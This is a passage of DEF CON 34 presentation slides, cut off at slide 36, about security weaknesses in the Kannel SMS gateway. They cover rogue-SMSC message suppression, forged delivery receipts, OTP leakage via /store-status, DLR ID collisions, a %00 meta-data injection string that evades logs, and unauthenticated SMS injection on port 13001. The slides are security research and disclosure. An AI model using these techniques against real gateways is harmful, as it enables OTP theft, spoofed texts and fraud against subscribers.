---
title: "Your OTP Never Arrived Attacking the Trust Boundary Where SMS Meets the Internet"
speakers: ["Kyprianos Vasilopoulos", "Nikos Vourdas"]
conference: "DEF CON"
conference_full: "DEF CON 34"
edition: "34"
year: null
source_pdf: "DEF CON 34/DEF CON 34 - Kyprianos Vasilopoulos, Nikos Vourdas - Your OTP Never Arrived Attacking the Trust Boundary Where SMS Meets the Internet - v1.pdf"
pages: 65
sha256: "c7c88970dad5845dc3e371280da54df41f40a43e24b03c44d24bcdb0f22b4137"
text_chars: 54212
ocr_pages: 0
has_ocr: false
redacted_secrets: 0
companion_files: []
extractor: "pymupdf4llm 1.28.2"
converted_at: "2026-08-12T00:23:29Z"
---
# Your OTP Never Arrived Attacking the Trust Boundary Where SMS Meets the Internet

**Speakers:** Kyprianos Vasilopoulos, Nikos Vourdas  
**Conference:** DEF CON 34  
**Source:** `DEF CON 34/DEF CON 34 - Kyprianos Vasilopoulos, Nikos Vourdas - Your OTP Never Arrived Attacking the Trust Boundary Where SMS Meets the Internet - v1.pdf` (65 pages)

## Slide 1

```
DEF CON 34 · LOGGED IN
```

# **`YOUR OTP NEVER ARRIVED`**

```
Attacking the Trust Boundary Where SMS Meets the Internet
A field study of Kannel—the open-source SMS gateway quietly running the world.
root@defcon:~/sms-gw$ ./present --target kannel --mode offensive _
Kyprianos Vasilopoulos·    Nikos Vourdas·    2026
```

```
1 / 65
```

## Slide 2

```
> whoami
```

## **`Who We Are`**

```
$ whoami
Kyprianos Vasilopoulos&&Nikos Vourdas// messaging infrastructure
```

```
$ id
```

```
Cyber Security Researchers
$ cat ./focus.txt
```

```
Among Other Topics: SMS · telecom & gateway security · breaking and fixing the pipes
$ cat ./why_us.txt
```

```
We know where the bodies are buried
```

```
$ ./why_this_talk.sh
```

```
Every "Your OTP is 1234" rides this infra. We followed one that never arrived. _
```

```
YOUR OTP NEVER ARRIVED // def con 34
```

```
2 / 65
```

## Slide 3

```
> cat /etc/kannel/what_is_this.md
```

## **`What Is Kannel?`**

- `Open-source SMS gateway, run by the Kannel Group.`

- `The connective tissue between apps and mobile networks (SMSCs).`

- `Speaks every carrier dialect: SMPP, UCP/EMI, CIMD2, SMASI, HTTP…`

- `Battle-tested across A2P (application-to-person) messaging stacks.`

###### **`1999`**

```
1.5.0
```

###### **`5+`**

```
First release
```

```
HA build · current line
```

```
SMSC protocols
```

```
FIELD NOTES
```

###### **`The catch`**

```
Community stable ended at 1.4.5 (2018).
Active work moved to the 1.5.0-SVN line
commercial deployments run; the long tail
still lags on 1.4.x —and it still fronts
huge volumes of real SMS traffic.
```

###### **`∞`**

```
Messages sent
```

```
YOUR OTP NEVER ARRIVED // def con 34
```

```
3 / 65
```

## Slide 4

```
> ps aux | grep box
```

## **`The Boxes`**

```
Kannel is a set of cooperating daemons. Everything funnels through one core process.
```

```
CORE
```

```
bearerbox
```

```
The heart. Connects to SMSCs
& bearers, routes every
message. Hosts the admin
HTTP interface.
```

```
SMS
```

```
smsbox
```

```
SMS services + the sendsms
HTTP API. Maps keywords/URLs
to apps; handles MO/MT.
```

```
SMPP
```

```
smppbox
```

```
ESME server (opensmppbox):
lets apps speak SMPP to
Kannel directly.
```

```
WAP
```

###### **`wapbox`**

```
The WAP stack
(WSP/WTP/WTLS). Historic
reason Kannel exists —now
legacy.
```

```
+ also: sqlbox · amqpbox—store-and-forward, queue integration.
```

```
YOUR OTP NEVER ARRIVED // def con 34
```

```
4 / 65
```

## Slide 5

```
> the big picture
```

#### **`How Kannel Fits In`**

```
In one line: Kannel is the middle box that lets an app (your bank) send a text to your phone.
```

```
KANNEL  —the gateway
```

###### **`Mobile phone`**

```
You —gets the text
```

###### **`Mobile network`**

```
Cell towers / your
carrier
```

```
SMSC
```

```
Carrier's SMS 'post
office'
```

```
bearerbox
```

```
smsbox
```

```
the switchboard —
the front door —
routes every
apps send texts
message, talks to
here via a web API
carriers
```

###### **`App / Website`**

```
Your bank, Amazon…
wants to send a code
```

```
How your OTP reaches you  (read right → left):
```

- **`(1)`** `Your bank's app hands the code to Kannel's` **`smsbox (2) Bearerbox`** `picks the right carrier (SMSC)`

- **`(3)`** `The SMSC sends it over the mobile network` **`(4)`** `Your phone buzzes.`

```
Break any single hop —and “your OTP never arrived.”
```

```
YOUR OTP NEVER ARRIVED // def con 34
```

```
5 / 65
```

## Slide 6

```
>  the outside world
```

### **`External Entities`**

```
Everything that talks TO Kannel —not part of Kannel itself.
```

###### **`Mobile Device`**

```
SMS / MMS / USSD
```

```
The actual phone. Never talks to Kannel
directly —it goes through the carrier's SMSC
first.
```

###### **`SMPP Client (ESME)`**

```
external ESME
```

```
A third-party app that speaks SMPP natively
instead of HTTP. Bulk/aggregator platforms.
Binds to OpenSMPPBox.
```

###### **`Carrier SMSC`**

```
operator network
```

```
The operator's Short Message Service Centre
(Vodafone, Orange…). Kannel connects to it
via SMPP.
```

###### **`Legacy — WAP era`**

```
WSP / WTP · WML
```

```
WAP devices + WML content servers (~2000–
2008). WAPBox compiles WML→WBXML. Largely
irrelevant today.
```

###### **`HTTP Client`**

```
REST / sendsms
```

```
A web app/script that sends SMS, e.g. calls
http://kannel:13013/cgi-bin/sendsms?... —the
common way.
```

```
YOUR OTP NEVER ARRIVED // def con 34
```

```
6 / 65
```

## Slide 7

###### `> protocol translators`

### **`SMSC Connection Drivers`**

```
How Kannel talks to carriers. Each driver lives inside bearerbox and converts the carrier protocol into Kannel's internal
Msg.
```

###### **`SMPP SMSC`**

```
smsc_smpp.c
```

```
SMPP v3.4 —the industry standard. submit_sm
/ deliver_sm + TLV params.
```

###### **`HTTP SMSC`**

```
smsc_http.c
```

```
Carriers/aggregators with an HTTP API.
Clickatell, Kannel-to-Kannel chaining,
custom.
```

###### **`CIMD2 SMSC`**

```
smsc_cimd2.c
```

```
Nokia's Computer Interface to Message
Distribution. Older Nokia infrastructure.
```

###### **`UCP / EMI SMSC`**

```
smsc_emi.c
```

```
CMG's Universal Computer Protocol. Mostly
European networks (X.25 variant too).
```

###### **`SMASI / OIS`**

```
smsc_smasi.c / smsc_ois.c
```

```
Nokia's legacy access interfaces for older
SMSC gear.
```

###### **`Fake SMSC`**

```
smsc_fake.c
Testing/simulation driver —no real carrier.
(Shown dashed in the diagram.)
```

```
also: SOAP (smsc_soap.c) · SEMA (smsc_sema.c)
```

```
YOUR OTP NEVER ARRIVED // def con 34
```

```
7 / 65
```

## Slide 8

###### `> the engine`

### **`BearerBox — The Core`**

```
bearerbox.c—one long-lived daemon. The central sorting office between the carrier world (left) and the application world
(right).
```

```
Message Router
```

```
msg.h
```

```
routes by the Msg struct · e.g. bank OTP → carrier
```

```
SMSC Connection Mgrbb_smscconn.c
```

```
monitors every carrier link · e.g. SMPP bind to Vodafone
```

```
Box Connection Mgr
```

```
bb_boxc.c
```

```
TCP listeners · e.g. smsbox/smppbox attach on :13001
```

```
DLR Storagedlr.c
```

```
delivery reports · e.g. a PgSQL DLR table
```

###### **`meta_data Engine`**

```
meta_data.c
```

```
URL-encoded TLV key-values attached to messages
```

```
Logging & Admin HTTPbb_http.c :13000
admin · e.g. GET /status, GET /shutdown
```

```
Octstr / Gwlib
```

```
octstr.c
```

```
binary-safe string lib + HTTP/threading internals
```

```
WAP Stackwapbox.c · UDP :9200-9202
WDP/WTP/WSP layers (legacy)
```

```
SINGLE POINT OF FAILURE  everything runs in one process —own bearerboxand you own the gateway: all messages, all links, all creds
in memory.
```

```
YOUR OTP NEVER ARRIVED // def con 34
```

```
8 / 65
```

## Slide 9

###### `> cooperating daemons`

### **`The Boxes — Deep Dive`**

```
Separate processes that connect to BearerBox over TCP. The box
default.
```

```
bearerbox link on port 13001 has no authentication by
```

###### **`SMSBox`**

###### **`OpenSMPPBox`**

###### **`WAPBox`**

###### **`SQLBox`**

###### **`PluginBox`**

```
smsbox.c· :13013
HTTP sendsmsAPI + MO
routing to your URL.
Concatenation, charset,
sms-services.
```

```
opensmppbox.c· :2775
Turns Kannel into an
SMPP server —external
ESMEs bind in. PDUMsg
translation.
```

```
wapbox.c· :13002
WAP application layer:
WML→WBXML, sessions,
WAP Push. Legacy.
```

```
sqlbox.c· :13001
Third-party addon.
Transparent proxy
between BearerBox&
SMSBox; queue via DB
rows, log MO/DLR.
```

```
custom plugins
Generic extension point
for custom message-
processing logic. Non-
standard (dashed in
diagram).
```

```
YOUR OTP NEVER ARRIVED // def con 34
```

```
9 / 65
```

## Slide 10

###### `> your software`

### **`The Applications`**

```
Your software —the reason Kannel exists. Completely external to Kannel; this is where the OTP starts and ends.
```

###### **`HTTP App`**

###### **`Server`**

```
MO receive callback
Receives incoming SMS:
SMSBoxsends an HTTP
GET/POST with sender,
receiver, text,
timestamp.
```

###### **`MT Sending App`**

```
sendsmsHTTP API
Sends outgoing SMS via
GET /cgi-
```

```
bin/sendsms?...&to=+30…
&text=Your+OTP+is+4821.
Your
2FA/notify/marketing.
```

###### **`ESME`**

###### **`Application`**

```
SMPP bind → OpenSMPPBox
Enterprise app that
speaks SMPP instead of
HTTP; binds to
OpenSMPPBox:2775.
```

###### **`DLR Receiver`**

```
HTTP callback for DLRs
A URL on your server
that receives delivery-
report callbacks
(delivered / failed /
buffered).
```

###### **`Database`**

```
MySQL / PgSQL/ Oracle
With SQLBox: INSERT
rows to send SMS, read
tables for inbound +
DLRs.No HTTP/SMPP
needed.
```

```
Trust boundary: apps speak HTTP/SMPP to Kannel; Kannel speaks carrier protocols to the SMSC. Our talk lives on that seam.
```

```
YOUR OTP NEVER ARRIVED // def con 34
```

```
10 / 65
```

## Slide 11

```
> who listens where
```

### **`Port Map && Connection Topology`**

###### **`BEARERBOX`**

- `├` **`:13000`** `Admin HTTP` _`// status, shutdown, reload, restart`_

- `├` **`:13001`** `Box listener` _`// SMSBox + OpenSMPPBox + SQLBox connect here`_

- `├` **`:13002`** `WAP listener` _`// WAPBox connects here`_

- `├` **`:9200`** `WDP / UDP` _`// WAP connectionless (also 9201, 9202)`_

- `└ outbound SMSC links` _`// SMPP typically :2775 to the carrier`_

###### **`SMSBOX`**

- `├` **`:13013`** `sendsms HTTP` _`// MT send API + MO receive`_

- `└ connects → BearerBox :13001`

###### **`OPENSMPPBOX`**

- `├` **`:2775`** `SMPP server` _`// ESMEs bind here`_

- `└ connects → BearerBox :13001`

###### **`SQLBOX`**

- `├ connects → BearerBox :13001` _`// pretends to be an smsbox`_

- `└ connects → Database` _`// polls for MT, logs MO/DLR`_

###### **`WAPBOX`**

- `└ connects → BearerBox :13002`

```
YOUR OTP NEVER ARRIVED // def con 34
```

```
11 / 65
```

## Slide 12

```
> strace ./message
```

#### **`How a Message Flows`**

- **`MT — Mobile Terminated (Sender → phone)`**

   - **`MO — Mobile Originated (phone → System)`**

- **`1`** `App calls smsbox` **`sendsms`** `HTTP API.`

   - **`1`** `Subscriber texts a keyword/shortcode → SMSC.`

- **`2`** `Smsbox hands it to bearerbox (:13001).`

   - **`2`** `SMSC pushes to bearerbox (SMPP/UCP/CIMD2).`

- **`3`** `Bearerbox` **`routes`** `to the right SMSC.`

   - **`3`** `Bearerbox matches an` **`sms-service`** `.`

- **`4`** `SMSC delivers to handset; DLR returns.`

- **`4`** `Smsbox calls your app URL; reply → MT.`

```
Key truth: bearerbox is the single chokepoint—routing, queueing, SMSC state, and the admin interface all live
here.
```

```
YOUR OTP NEVER ARRIVED // def con 34
```

```
12 / 65
```

## Slide 13

```
> nmap -p 13000,13013 the-internet
```

### **`…So What's Actually Exposed?`**

```
We pointed internet-wide scanners at it. The chokepoint is sitting on the public internet.
```

```
~800-1000~850–1.2k
```

```
Live on ZoomEye (2026)
```

```
Kannel on Shodan
```

```
1.4.x
```

```
Dominant —all EOL
```

```
:13000
```

```
Admin ports open
```

- `Exposed` **`bearerbox admin`** `&` **`smsbox sendsms`** `interfaces.`

- `EOL versions, default ports, sometimes default` **`status/admin passwords.`**

- `▸Next: what an attacker can actually` **`do`** `with that.  →`

```
YOUR OTP NEVER ARRIVED // def con 34
```

```
13 / 65
```

## Slide 14

```
§4 · TRUST BOUNDARY PRIMITIVES
```

## **`The Core Contribution: Trust-Boundary Attack Primitives`**

```
Some are inherent to SMS itself; some are Kannel's own. All are the consequence of a 25-year-old
trust assumptionmeeting a modern threat model.
```

```
YOUR OTP NEVER ARRIVED // def con 34
```

```
14 / 65
```

## Slide 15

```
> 4.1 · setup
```

##### **`Who Does Kannel Trust?`**

- `Kannel is a relay — it submits what the app asks and delivers what the SMSC says.`

- `SMPP (1999) assumed the SMSC was a trusted carrier node on a private leased line — trust was physical.`

- `Today that 'trusted' SMSC can be a cloud aggregator, a reseller, a misconfigured relay — or an attacker.`

- `A secure design would verify the upstream — signed receipts, mutual TLS. Kannel does neither.`

```
Kannel has zero mechanism to verify that its upstream SMSC is telling the truth.
```

```
YOUR OTP NEVER ARRIVED // def con 34
```

```
15 / 65
```

## Slide 16

```
> 4.2 · why interception is trivial
```

##### **`Why Interception Is Trivial`**

- `Outbound TLS defaults to SSL_VERIFY_NONE`

- `accepts any certificate.`

- `It verifies only if a trusted-CA file is`

- `configured (off by default)…`

- `…and even then, the callback does no`

- `hostname check.`

- `So a MitM with any cert succeeds — the`

- `OTP flows in cleartext.`

```
INHERENT: SMS is cleartext at every hop.   KANNEL: outbound TLS verifies nothing by default.
```

- **`'Reading SMS is inherent'  Yes — but no cert verification lets a MitM in, not just a contracted carrier.`**

```
YOUR OTP NEVER ARRIVED // def con 34
```

```
16 / 65
```

## Slide 17

```
> 4.3 · lab setup
```

##### **`Lab Setup: Rogue SMSC`**

- `Kannel 1.5.0 stock — no mods`

- `Rogue SMSC: speaks valid SMPP, lies`

- `about outcomes`

- `Observer: annotates the PDU`

- `exchange live`

- `App: simulated bank / OTP platform`

```
Every PDU here is valid SMPP —nothing is malformed. The vulnerability is the trust model: Kannel believes whatever
its SMSC reports —delivery, errors, message-ids —with no verification. 'Valid' is not 'truthful.'
```

```
YOUR OTP NEVER ARRIVED // def con 34
```

```
17 / 65
```

## Slide 18

```
> 4.4 · primitive 1
```

##### **`Silent Censorship`**

```
“Three messages go in. Two come out. The application never notices.”
```

```
Appsees:#1delivered·#2nocallback("intransit?")·#3delivered
Reality:#2waskilled.Subscriberneverreceivedit.Notrace.
```

- `generic_nack is a valid SMPP response — the`

- `SMSC is allowed to reject.`

- `Kannel can't distinguish a deliberate,`

- `content-targeted drop from a real network error.`

- `Kannel doesn't retry it, doesn't flag it,`

- `and logs nothing.`

- `The app sees a generic failure (or`

- `nothing); the victim's phone stays silent.`

```
INHERENT: any hop can drop a message.
KANNEL: it can't tell a targeted drop from
a real error, and logs nothing.
```

- **`'Valid nack — why shouldn't Kannel trust it?'  It should, at the protocol layer — that IS the finding. Same trust-model class as SS7.`**

```
YOUR OTP NEVER ARRIVED // def con 34
```

```
18 / 65
```

## Slide 19

```
> 4.5 · primitive 2
```

###### **`Billing Fraud via Forged Receipt`**

```
“The customer is charged. The message was never sent.”
```

- `The carrier (SMSC) replies "delivered" — a normal,`

- `valid-looking reply. Nothing is broken.`

- `But a delivery receipt can't be proven — it isn't`

- `signed, so neither Kannel nor the app can tell a real 'delivered' from a fake one.`

- `Kannel passes 'delivered' up as fact — and the`

- `customer is billed on the strength of it.`

- `The phone got nothing — and nothing, anywhere,`

- `flags the receipt as a lie.`

###### **`INHERENT: SMPP receipts are`**

```
unauthenticated —an SMSC can lie.
KANNEL: it relays the lie to the app as
truth, no anomaly signal.
```

```
'The SMSC defrauds its customer, not
Kannel'  True —and the app can't tell.
The consequence: your bank acts on a
'delivered' nobody can check.
```

```
YOUR OTP NEVER ARRIVED // def con 34
```

```
19 / 65
```

## Slide 20

```
> 4.6 · primitive 3 · OTP interception
```

##### **`Read, Forge, Suppress — Attacking the OTP Path`**

```
Bank --OTP--> Kannel --> rogue SMSC / MitM
```

- `1) READ      the code is cleartext on the wire, or on Kannel's /store-status page`

- `2) FORGE     fake DELIVRD -> app believes 2FA OK`

- `3) SUPPRESS  generic_nack -> the phone stays silent`

- `Read: the OTP is cleartext in the`

- `submit_sm (no TLS verify) — or on /storestatus.`

```
app: 'delivered'   phone: silent   attacker:holds the code
```

- `Forge: a fake DELIVRD so the app believes`

- `the code was delivered.`

- `Suppress: a generic_nack so the victim`

- `never receives it (no race).`

- `Result: the app shows success, the phone`

- `stays silent, the attacker holds the code.`

```
YOUR OTP NEVER ARRIVED // def con 34
```

```
20 / 65
```

## Slide 21

```
> 4.7 · info disclosure
```

##### **`Read OTPs Off /store-status`**

```
GET /store-status            (status-class auth)
```

- `-> if status-password unset: OPEN (no auth)`

- `-> dumps every in-flight message:`

- `[Sender] [Receiver] ... [Message]`

```
...  +30698..  "Your code is 847291"  <-OTP cleartext
```

- ➢ **`THE BUG —`** `full message body printed in cleartext — incl. the OTP`

- `store_status() prints`

- `sender/receiver/UDH/Message (bb_store.c:145)`

- `Open if status-password unset AND a store`

- `is configured`

- `Live snapshot of messages in transit —`

- `incl. OTPs`

- `No credentials, no timing — just read the`

- `code off the page`

```
Read the OTP without being the SMSC —if monitoring is open + a store is on.
```

```
YOUR OTP NEVER ARRIVED // def con 34
```

```
21 / 65
```

## Slide 22

```
> 4.8 · two identifiers
```

##### **`sequence_number vs message_id — Which One Matters`**

```
—
sequence_number
```

```
—
the link                message_idthe message
```

```
──────────────────────────────              ──────────────────────────────
per-PDU counter, Kannel <-> SMSC            assigned by the SMSC in submit_sm_resp
bind session; matches req <-> resp          it names the actual SMS
submit_sm5  <->  submit_sm_resp5          the delivery receipt carries it back
= link plumbing, NOT an SMS id              = Kannel's DLR lookup key
CENSORSHIP rejects by this                  RECEIPT attacks ride on this
```

- **`sequence_number: a per-PDU counter on the link. Censorship uses it to reject the in-flight message.`**

- **`message_id: the SMSC's name for the message, echoed in the delivery receipt — Kannel's DLR key.`**

- **`Receipt attacks ride on message_id: forged DELIVRD references it; Interception reads cleartext — neither.`**

- **`Only the sequence_number is sequential by design; message_id format is SMSC-defined.`**

```
YOUR OTP NEVER ARRIVED // def con 34
```

```
22 / 65
```

## Slide 23

```
> 4.9 · primitive 4
```

###### **`DLR Cross-Contamination`**

```
“The bank's wire-transfer confirmation fires —for the wrong customer.”
```

```
SMSCreturnsmessage_idinthedeliveryreceipt.Kannelasks:alldigits?
```

```
┌──────────────────────────────────────────────────────────┐
│gw_isdigit(id)==TRUE→decimal→DLRtable[decimal]│
│gw_isdigit(id)==FALSE→hex→DLRtable[hex](!)│
└──────────────────────────────────────────────────────────┘
```

```
Bank'smsg_id="12345"(decimal)→storedatslothash("12345")
Roguereceiptmsg_id="1e240"→has'e'→gw_isdigit=FALSE
→parsedashex0x1e240=123456dec
→lookuphitsaDIFFERENTcustomer'sslot
→theWRONGcallbackURLfires
```

- `To match a 'delivered' receipt to its message,`

- `Kannel turns the ID into a number - guessing decimal or hex ('all digits?').`

- `Bad guess collides: 'ff' read as hex and '255'`

- `as decimal both become 255 - two different messages look identical.`

- `So one customer's 'delivered' receipt lands on`

- `another customer's callback.`

- `A real Kannel bug - reproduced live three ways,`

- `not 'working as designed.'`

```
YOUR OTP NEVER ARRIVED // def con 34
```

```
23 / 65
```

## Slide 24

```
> 4.10 · Primitive 4 · source
```

##### **`Two Code Paths, Two Different Bitmasks`**

`STORE  submit_sm_resp smsc_smpp.c:1981 if ((msg_id_type & 0x01) ||        // bit 0x01 ▸ Store checks bit 0x01; lookup checks !octstr_check_range(id, gw_isdigit)) bit 0x02 — different bits of ONE config tmp = strtoll(id, NULL, 16);   // HEX value. else tmp = strtoll(id, NULL, 10);  // DECIMAL ▸ So store and lookup can disagree on LOOKUP deliver_sm DLR        smsc_smpp.c:1655 hex vs decimal for the same message_id.` **`if ((msg_id_type & 0x02) ||        // bit 0x02  !!`** `!octstr_check_range(id, gw_isdigit)) ▸ A fallback forces hex on both when the tmp = strtoll(id, NULL, 16);   // HEX id has letters — so the bug only bites else tmp = strtoll(id, NULL, 10);  // DECIMAL on all-digit ids.` ➢ **`THE BUG —`** `store checks 0x01; lookup checks 0x02 — different bits, same config ▸ With msg-id-type=0x01: stored hex, looked up decimal. They never match.` **`A fragile, under-warned config: store checks bit 0x01, lookup bit 0x02 - the two silently desync. Reproduced live, no warning.`**

```
'Reading SMS is inherent'  Yes —but no cert verification lets a MitM in, not just a contracted carrier.
```

```
YOUR OTP NEVER ARRIVED // def con 34
```

```
24 / 65
```

## Slide 25

```
> 4.11 · Primitive 4· walkthrough
```

##### **`Why the Receipts Collide — Step by Step`**

```
config:  msg-id-type = 0x01
(1) SMSC ack: submit_sm_respmessage_id= "100"
(2) STORE: 0x01 & 0x01 = TRUE  -> hex("100") = 256
DLR table key  =  256
(3) Receipt arrives: receipted_message_id= "100"
(4) LOOKUP: 0x01 & 0x02 = FALSE -> dec("100") = 100
dlr_find(key = 100)
```

```
(5) 256 != 100  ->  receipt does NOT match the message
```

- `Same id '100': stored as 256, looked`

- `up as 100 — no match. ▸ Best case: the delivery receipt is silently dropped (DLR loss). ▸ Worst case: 100 IS another message's key → its callback fires for THIS receipt.`

- `Runtime-reproduced — 3 scenarios (DLR`

- `loss + cross-routing collision).`

```
One config value, two bitmasks → the receipt lands on the wrong message.
```

```
'Reading SMS is inherent'  Yes —but no cert verification lets a MitM in, not just a contracted carrier.
```

```
YOUR OTP NEVER ARRIVED // def con 34
```

```
25 / 65
```

## Slide 26

```
> 4.12 · how it works
```

###### **`The Octstr Split (NUL Byte)`**

```
Kannel's own string type sees a different message than its logs do.
```

```
Octstr: [ H e l l o \0 s e c r e t ]   len= 12
binary-safe, length-prefixed
```

```
octstr_len()       -> 12        sees EVERYTHING
octstr_get_cstr()  -> 'Hello'   stops at \0
|                        |
```

```
engine / SMPP / parser     logs / monitor / app
```

```
attacker sends:  Hello\0secret        (%00 in the field)
LOG / monitor : "Hello"              clean -half the truth
SMPP / wire   : Hello + secret       full payload applied
=> logs say one thing, the wire does another
```

- `Octstr is binary-safe; octstr_get_cstr()`

- `returns a C string that stops at the first \0.`

- `Same field, two readings: the engine`

- `processes all of it; logging sees half.`

- `This asymmetry repeats across 7+ call sites`

- `in Kannel.`

```
▸A %00 in an HTTP parameter creates the split
```

```
—invisible to monitoring.
```

- `Audit evasion: your log / SIEM records the`

- `clean half while the full payload reaches the wire - forensics diverge from reality.`

```
YOUR OTP NEVER ARRIVED // def con 34
```

```
26 / 65
```

## Slide 27

```
> 4.13 · meta-data injection
```

##### **`Split Reality — Hidden SMPP Parameters`**

```
sendsmsmeta-data =
?info?status=ok%00?smpp?source_addr_ton=5&data_coding=4
decodes inside Kannel to:
?info?status=ok \0 ?smpp?source_addr_ton=5 ...
^ monitoring sees     ^ SMPP engine applies
access log:  [META:?info?status=ok]   (clean)
submit_sm:  source_addr_ton=5        (alphanumeric)
In plain terms: monitoring sees a harmless status;
the network gets hidden instructions.
```

```
▸A logged-in sender hides a second
command block after a null byte (%00).
```

```
▸The log, the meta-data header and the
app callback all stop at the null -they
see only the harmless first half.
```

```
▸But Kannel's SMPP engine reads it all
-the hidden sender-type, encoding and
extra fields go out on the wire.
```

```
INHERENT: none · KANNEL: Octstrsplit (unique) · HIGH —audit evasion + hidden injection
```

```
YOUR OTP NEVER ARRIVED // def con 34
```

```
27 / 65
```

## Slide 28

```
> 4.14 · source
```

##### **`One Asymmetry, Seven Call Sites`**

`gwlib/octstr.c octstr_len(os)      -> os->len // binary-safe ▸ url_decode writes \0 then keeps reading — octstr_get_cstr(os) -> os->data  // C str, stops at \0 so the NUL ends up inside the string. url_decode runs past %00            octstr.c:1764 ▸ meta_data_unpack uses octstr_len → parses` **`} while (*string);  // checks INPUT, not output`** `hidden groups past the \0. truncate at \0 (octstr_get_cstr): ▸ Every log / monitor / header uses bb_alog.c:412   access-log body & sender octstr_get_cstr → truncates at \0. smsbox.c X-Kannel-Meta-Data header, exec arg meta_data_unpack uses octstr_len -> reads PAST the \0 ▸ Engine binary-safe + monitoring C-string = the split. WHY IT MATTERS ▸ Net: the message on the wire and the meta_data_unpack -> hidden SMPP params reach the PDU message in your logs are different - and logs / headers   -> show only the clean prefix nothing warns you.` ➢ **`THE BUG —`** `writes \0 but loops on the INPUT pointer — embeds the NUL` **`KANNEL bug — the binary-safe / C-string asymmetry. Not protocol, not config.`**

```
YOUR OTP NEVER ARRIVED // def con 34
```

```
28 / 65
```

## Slide 29

```
> 4.15 · attack surface
```

##### **`Where the NUL Travels`**

|`SURFACE`|`WHAT'S HIDDEN`|`ARTEFACT`|`▸The engine reads the whole field (past the`
|
|---|---|---|---|
|`------------------`|`--------------------`|`------------`|`NUL); logs and monitors stop at the NUL - so`
|
|`sendsms text=`|`body after \0`|`len!=shown`|`everywhere below, the two disagree.`|
|`sendsms meta-data=`|`hidden SMPP params`|`len!=shown`|`▸from= corrupts the PDU (a DoS) — it does`
|
|`sendsms from=`|`corrupts PDU (DoS)`|`PDU parse err`|`not hide a sender.`|
|`access log`|`body / UDH`|`len!=shown`|`▸exec=: the NUL TRUNCATES the command — it`|
|`smsbox exec=`|`arg after \0 (cut)`|`short arg`|`does NOT give a shell.`|
|`inbound SMPP body`|`binary after \0`|`len!=shown`|`▸Only detectable artefact: logged length !=`|
|`UCS-2 (inherent!)`|`the WHOLE body`|`[msg:N/] empty`|`displayed content.`|
|**`Breadth is the point — `**|**`the asymmetry leaks every`**|**`where octstr_get_cstr `**|**`is used.`**|

```
YOUR OTP NEVER ARRIVED // def con 34
```

```
29 / 65
```

## Slide 30

```
> 4.16 · the free one
```

##### **`UCS-2: Every Message Logs as Empty`**

```
'Your OTP is 847291'  in UCS-2 =
00 59 00 6F 00 75 00 72 ...  // ASCII char -> \0 first
^ first byte is \0
```

```
▸UCS-2 stores \0 as the first byte of
every ASCII character.
```

- `So Kannel logs the body as EMPTY — for`

- `every UCS-2 message.`

```
bb_alog.c: octstr_get_cstr(msgdata) -> ''  (stops at 0)
log line : [msg:36/]     36 bytes, EMPTY body
```

```
'Y'=00 59  'o'=00 6F  'u'=00 75  'r'=00 72   ...
every char -> 2 bytes; high byte always 00,
so,the body BEGINS with a 00 (a NUL).
```

```
▸No injection, no %00 needed —audit-
blindness for free.
```

- `Operators can't read UCS-2 content`

- `from the access log at all.`

- `Any non-Latin text (Greek, Arabic,`

- `emoji) is UCS-2 by default - those messages are invisible in the log too.`

```
Not even an attack —an inherent logging blind spot. Send UCS-2, become invisible.
```

```
'Reading SMS is inherent'  Yes —but no cert verification lets a MitM in, not just a contracted carrier.
```

```
YOUR OTP NEVER ARRIVED // def con 34
```

```
30 / 65
```

## Slide 31

```
> 4.18 · synthesis
```

##### **`These Primitives → Two Root Causes`**

```
KANNEL —built years ago, never hardened
┌───────────────────┴───────────────────┐
▼▼
A BROKEN TRUST MODEL            AN UNAUDITED CODEBASE
(by design)                     (by neglect)
trusts the SMSC blindly         25-year-old C, no review
no signed receipts, no          binary-safe vs C-string,
TLS verification                hex/dec message-ids
│                                   │
▼▼
censorship · billing · cross-contam
2FA/OTP interception            NUL split
```

```
The trust-model flaws can't be patched —the architecture must change. The code bugs can..
```

```
YOUR OTP NEVER ARRIVED // def con 34
```

```
31 / 65
```

## Slide 32

```
> 4.19 · threat model
```

##### **`Who Can Exploit This?`**

```
ATTACK                    POSITION NEEDED          ACTOR
```

```

Silent censorship         be / own the SMSC        rogue agg· insider
Billing fraud             be / own the SMSC        fraud agg· insider
2FA / OTP bypass          be / MitM the SMSC       rogue agg· MitM
DLR cross-contamown SMSC (+ id config)   rogue agg· relay
NUL audit evasion         a sendsmsAPI account    insider · stolen creds
Reach an exposed Kannel   box/admin port open       anyone (Shodan)
```

```
Most need a position between Kannel and the carrier —a rogue or MitM SMSC. The NUL audit-evasion needs only a
sendsms login.
```

```
YOUR OTP NEVER ARRIVED // def con 34
```

```
32 / 65
```

## Slide 33

```
> 4.20 · live demo
```

##### **`Live Demo — Observer in Action`**

```
The observer sees the truth. The application
sees a lie. Kannel has no way to tell the
difference.
```

```
YOUR OTP NEVER ARRIVED // def con 34
```

```
33 / 65
```

## Slide 34

```
> §5 · surrounding attack surface
```

## **`The Surrounding Attack Surface`**

```
Before the carrier link: the box port & the admin port. Just reach the port.
```

```
YOUR OTP NEVER ARRIVED // def con 34
```

```
34 / 65
```

## Slide 35

```
> 5.1 · how it works
```

###### **`Unauthenticated SMS Injection — How It Works`**

```
The box port is the gateway's internal back door —and it has no lock.
```

```
attacker            bearerbox:13001          SMSC -> phone
|  TCP connect (no auth) |                     |
| --box PDU: type=sms->| deliver_sms_to_queue|-> sent
|                        | (no identify needed)|
| <-------ack ---------|                     |
one box PDU, sent immediately (no login):
type=smssender="YourBank"  receiver=+30...  text=...
-> accepted on the FIRST read, before any identify
```

```
▸smsbox/ sqlbox/ opensmppboxnormally attach
here over TCP
▸Kannel assumes :13001 is internal-only —
nothing enforces it
▸A type=smsPDU is routed on the FIRST read,
pre-identify
▸So anyone who reaches :13001 sends SMS as
anyone
```

```
▸Sender, receiver and text are fully attacker-
set -spoof anyone, at scale.
```

```
13001the internal port that should never
face the internet
```

```
YOUR OTP NEVER ARRIVED // def con 34
```

```
35 / 65
```

## Slide 36

```
> 5.1a · Unauthenticated SMS Injection · source
```

##### **`No Creds? No Problem!`**

